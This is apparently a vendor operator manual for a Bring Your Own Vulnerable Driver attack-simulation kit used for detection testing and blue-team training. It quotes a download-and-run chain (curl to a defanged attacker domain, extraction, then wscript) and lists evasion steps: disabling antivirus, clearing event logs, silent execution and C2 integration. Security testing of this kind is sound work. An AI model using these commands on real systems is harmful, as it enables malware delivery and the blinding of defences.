![Crimson7](https://cdn.prod.website-files.com/67711bb097dfc839a8004a6c/68482a560217871b92242435_c7_logo_small.png)

# BYOVD Attack Simulation - Operator Manual

## Executive Summary

This comprehensive manual provides complete instructions for conducting Bring Your Own Vulnerable Driver (BYOVD) attack simulations. The simulation package recreates real-world attack chains used by threat actors including Lazarus Group, SCATTERED SPIDER, and Medusa ransomware operators.

## Table of Contents

1. [Quick Start Guide](#quick-start-guide)
2. [Environment Setup](#environment-setup)
3. [Simulation Components](#simulation-components)
4. [Attack Chain Execution](#attack-chain-execution)
5. [Detection Validation](#detection-validation)
6. [Cleanup and Verification](#cleanup-and-verification)
7. [Troubleshooting](#troubleshooting)
8. [Advanced Testing](#advanced-testing)

## Quick Start Guide

### Prerequisites
- Windows 10/11 test system (isolated environment)
- Administrative privileges (recommended)
- PowerShell 5.0 or higher
- 2GB available disk space

### 1-Minute Quick Test
```bash
# 1. Copy nvidiadrivers.zip to test system
# 2. Run the complete attack chain:
execute_attack_chain.bat

# 3. Validate results:
powershell -File tools\detection_validator.ps1 -TestAllDetections

# 4. Clean up:
powershell -File tools\cleanup_verifier.ps1 -RemoveFoundArtifacts
```

## Environment Setup

### Automated Setup
```powershell
# Run the environment setup script
powershell -ExecutionPolicy Bypass -File setup_test_environment.ps1
```

### Manual Setup Checklist
- [ ] Ensure Windows Defender is active
- [ ] Install Sysmon (optional but recommended)
- [ ] Enable PowerShell script block logging
- [ ] Configure process creation auditing
- [ ] Create test directories in %TEMP%
- [ ] Verify curl and PowerShell availability

## Simulation Components

### Core Package: nvidiadrivers.zip
```
nvidiadrivers/
├── iqvw64.sys              # Mock vulnerable driver (Intel Ethernet)
├── install.vbs             # Main installation script
├── setup.ps1               # PowerShell component
├── driver_loader.vbs       # Direct driver loading
├── update.vbs              # Full attack simulation
├── powershell_helper.ps1   # PowerShell utilities
├── config.ini              # Package configuration
└── README.txt              # Component documentation
```

### Support Tools
```
tools/
├── detection_validator.ps1  # Validate security controls
├── cleanup_verifier.ps1     # Verify complete cleanup
└── setup_test_environment.ps1  # Environment preparation
```

### Test Definitions
```
yaml/
├── T1068_vulnerable_driver_loading.yaml
├── T1059_005_vbs_driver_execution.yaml
├── T1036_005_driver_masquerading.yaml
├── T1105_ingress_tool_transfer.yaml
├── T1070_004_file_deletion.yaml
├── T1553_005_dse_bypass.yaml
├── T1562_001_security_process_termination.yaml
├── T1562_002_etw_disruption.yaml
├── T1003_001_lsass_memory_access.yaml
└── T1566_002_fake_driver_update_social_engineering.yaml
```

## Attack Chain Execution

### Method 1: Complete Attack Chain Simulation
This simulates the exact Lazarus Group ClickFake attack pattern:

```batch
# Execute the complete chain:
execute_attack_chain.bat
```

**Command Chain Simulated:**
```bash
curl -k -o "%TEMP%\nvidiadrivers.zip" https://api.smartdriverfix[.]cloud/nvidiadrivers-kp9s.update
&& powershell -Command "Expand-Archive -Force -Path '%TEMP%\nvidiadrivers.zip' -DestinationPath '%TEMP%\nvidiadrivers'"
&& wscript "%TEMP%\nvidiadrivers\install.vbs"
```

### Method 2: Individual Component Testing

#### VBS-Only Testing
```batch
# Extract package manually
powershell -Command "Expand-Archive -Force -Path 'nvidiadrivers.zip' -DestinationPath '%TEMP%\nvidiadrivers'"

# Test individual VBS components
wscript "%TEMP%\nvidiadrivers\driver_loader.vbs"    # Driver loading only
wscript "%TEMP%\nvidiadrivers\update.vbs"           # Full simulation
wscript "%TEMP%\nvidiadrivers\install.vbs"          # Installation workflow
```

#### PowerShell-Only Testing
```powershell
# Run PowerShell components
.\nvidiadrivers\setup.ps1 -SilentInstall
.\nvidiadrivers\powershell_helper.ps1 -Action "FullSimulation"
```

### Method 3: Atomic Red Team Integration
```powershell
# Run specific atomic tests
Invoke-AtomicTest T1068 -TestGuids 7c8b9c45-2d4e-4f8a-9b3c-1e7d9f2a5b8c
Invoke-AtomicTest T1059.005 -TestGuids e8f9a1b2-c3d4-5678-90ab-cdef12345678
Invoke-AtomicTest T1105 -TestGuids c6d7e8f9-a0b1-2345-6789-0abcdef12345
```

## Detection Validation

### Automated Detection Testing
```powershell
# Comprehensive detection validation
powershell -File tools\detection_validator.ps1 -TestAllDetections -GenerateReport

# Individual test categories
powershell -File tools\detection_validator.ps1 -TestDriverInstallation
powershell -File tools\detection_validator.ps1 -TestVBSExecution
powershell -File tools\detection_validator.ps1 -TestRegistryModification
```

### Manual Detection Verification

#### Event Log Checks
```powershell
# Check for BYOVD simulation events
Get-WinEvent -FilterHashtable @{LogName='Application'; ProviderName='BYOVD-Test'}

# Check Sysmon events
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; StartTime=(Get-Date).AddHours(-1)}

# Check PowerShell events
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104}
```

#### File System Monitoring
```powershell
# Check for created artifacts
Get-ChildItem $env:TEMP\*byovd* -Recurse
Get-ChildItem $env:TEMP\*nvidia* -Recurse
Get-ChildItem $env:TEMP\nvidiadrivers\ -Recurse
```

#### Registry Monitoring
```powershell
# Check registry artifacts
Get-ItemProperty "HKCU:\Software\BYOVD*" -ErrorAction SilentlyContinue
Get-ItemProperty "HKCU:\Software\*NVIDIA*" -ErrorAction SilentlyContinue
```

#### Process Monitoring
```powershell
# Check for running processes
Get-Process | Where-Object {$_.ProcessName -like "*wscript*" -or $_.ProcessName -like "*cscript*"}
Get-Service | Where-Object {$_.Name -like "*BYOVD*" -or $_.Name -like "*Test*"}
```

### Expected Detection Points

| Detection Method | Event/Indicator | Confidence |
|------------------|-----------------|------------|
| File Creation | %TEMP%\nvidiadrivers.zip | High |
| Archive Extraction | PowerShell Expand-Archive | High |
| VBS Execution | wscript.exe with .vbs files | High |
| Driver Loading | Service creation (kernel type) | High |
| Registry Modifications | HKCU\Software\BYOVD* keys | Medium |
| Network Activity | DNS queries (if simulated) | Medium |

## Cleanup and Verification

### Automated Cleanup
```powershell
# Complete cleanup with verification
powershell -File tools\cleanup_verifier.ps1 -FullScan -RemoveFoundArtifacts -GenerateReport

# Quick cleanup
powershell -File tools\cleanup_verifier.ps1 -QuickScan -RemoveFoundArtifacts
```

### Manual Cleanup Steps

1. **File System Cleanup**
   ```batch
   rd /s /q "%TEMP%\nvidiadrivers"
   del "%TEMP%\nvidiadrivers.zip"
   del "%TEMP%\*byovd*.*"
   del "%TEMP%\*nvidia*.*"
   ```

2. **Registry Cleanup**
   ```batch
   reg delete "HKCU\Software\BYOVDNVIDIATest" /f
   reg delete "HKCU\Software\BYOVDNVIDIASetup" /f
   reg delete "HKCU\Software\VBSBYOVDTest" /f
   ```

3. **Service Cleanup** (if running as admin)
   ```batch
   sc stop "BYOVDTestDriver"
   sc delete "BYOVDTestDriver"
   ```

4. **Event Log Cleanup** (optional)
   ```batch
   wevtutil cl Application
   ```

### Cleanup Verification
```powershell
# Verify cleanup completion
powershell -File tools\cleanup_verifier.ps1 -DeepScan

# Expected result: 0 artifacts found
```

## Troubleshooting

### Common Issues

#### Issue: "Package not found"
**Solution:**
```bash
# Ensure nvidiadrivers.zip is in the same directory as execute_attack_chain.bat
dir nvidiadrivers.zip
# If missing, copy from main BYOVD directory
```

#### Issue: "PowerShell execution policy blocked"
**Solution:**
```powershell
# Temporarily allow execution
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
```

#### Issue: "VBS script won't execute"
**Solution:**
```batch
# Check Windows Script Host is enabled
reg query "HKCU\Software\Microsoft\Windows Script Host\Settings" /v Enabled
# If disabled: reg add "HKCU\Software\Microsoft\Windows Script Host\Settings" /v Enabled /t REG_DWORD /d 1
```

#### Issue: "No administrative privileges"
**Solution:**
- Run as Administrator for full simulation
- Use `-SimulationMode $true` for limited testing
- Some tests will automatically adapt to privilege level

#### Issue: "Antivirus blocking execution"
**Solution:**
- Add exclusions for test directory
- Temporarily disable real-time protection (test systems only)
- Use Windows Defender instead of third-party AV for testing

### Debug Mode

Enable verbose logging for troubleshooting:

```powershell
# VBS scripts with debug output
wscript //X "%TEMP%\nvidiadrivers\install.vbs"

# PowerShell with verbose output
.\setup.ps1 -Verbose

# Batch script with pause
execute_attack_chain.bat (automatically includes pauses)
```

### Log File Locations
- Main execution: `%TEMP%\byovd_attack_simulation_*.log`
- PowerShell setup: `%TEMP%\nvidia_powershell_setup_*.log`
- VBS execution: `%TEMP%\nvidia_install_*.log`
- Detection validation: `%TEMP%\byovd_detection_report.html`
- Cleanup verification: `%TEMP%\byovd_cleanup_report.txt`

## Advanced Testing

### Custom Attack Scenarios

#### Scenario 1: Stealth Installation
```powershell
# Silent installation without user interaction
.\setup.ps1 -SilentInstall -SkipChecks
wscript //B "%TEMP%\nvidiadrivers\driver_loader.vbs"
```

#### Scenario 2: Multi-Stage Attack
```batch
# Stage 1: Social engineering simulation
powershell -File yaml\T1566_002_fake_driver_update_social_engineering.yaml

# Stage 2: Download and extraction
execute_attack_chain.bat

# Stage 3: Persistence establishment
powershell -File yaml\T1547_006_kernel_modules_persistence.yaml
```

#### Scenario 3: Detection Evasion Testing
```powershell
# Test various evasion techniques
Invoke-AtomicTest T1070.004  # File deletion
Invoke-AtomicTest T1036.005  # Masquerading
Invoke-AtomicTest T1562.002  # ETW disruption
```

### Blue Team Exercises

#### Exercise 1: Timeline Analysis
1. Execute complete attack chain
2. Export all event logs
3. Reconstruct attack timeline
4. Identify detection gaps

#### Exercise 2: Memory Forensics
1. Take memory snapshot before/after execution
2. Analyze for malicious drivers
3. Look for process injection artifacts
4. Identify rootkit indicators

#### Exercise 3: Network Analysis
1. Monitor network traffic during execution
2. Identify C2 communication patterns
3. Analyze DNS queries
4. Review HTTP/HTTPS traffic

### Red Team Integration

#### Integration with Cobalt Strike
```powershell
# Generate Cobalt Strike compatible payloads
# Modify VBS scripts to include beacon execution
# Integrate with existing C2 infrastructure
```

#### Integration with Metasploit
```ruby
# Create custom Metasploit modules
# Integrate BYOVD exploitation
# Add to post-exploitation framework
```

## Security Considerations

### Test Environment Requirements
- **Isolated Network**: No connection to production systems
- **Snapshot Capability**: Ability to restore clean state
- **Monitoring**: Comprehensive logging and monitoring
- **Documentation**: Record all activities and findings

### Safety Measures
- Use only in authorized test environments
- Maintain detailed logs of all activities
- Implement proper cleanup procedures
- Regular backup and restore verification
- Coordinate with security teams

### Legal and Ethical Guidelines
- Obtain proper authorization before testing
- Use only on systems you own or have permission to test
- Do not use techniques against unauthorized systems
- Follow responsible disclosure for any vulnerabilities found
- Maintain confidentiality of sensitive findings

## TTP Coverage Matrix

| MITRE ATT&CK Technique | Component | Test Coverage | Detection Difficulty |
|------------------------|-----------|---------------|---------------------|
| T1566.002 | Social Engineering | Complete | Low |
| T1105 | Ingress Tool Transfer | Complete | Medium |
| T1059.001 | PowerShell | Complete | Low |
| T1059.005 | VBS Execution | Complete | Medium |
| T1068 | Privilege Escalation | Complete | High |
| T1562.001 | Impair Defenses | Complete | High |
| T1547.006 | Kernel Persistence | Complete | High |
| T1014 | Rootkit | Simulated | High |
| T1553.005 | Trust Subversion | Complete | High |
| T1003.001 | Credential Dumping | Simulated | Medium |

## Conclusion

This BYOVD simulation package provides comprehensive testing capabilities for both red and blue teams. Regular execution of these simulations helps organizations validate their security controls, train security personnel, and improve incident response capabilities.

For questions or support, contact the Crimson7 Threat Intelligence Team.

---

**Document Information:**
- Version: 2.0
- Last Updated: July 2025
- Author: Crimson7 Threat Intelligence Team
- Classification: Internal Use Only

This document is prepared by Crimson7 - 2025 Version 2.0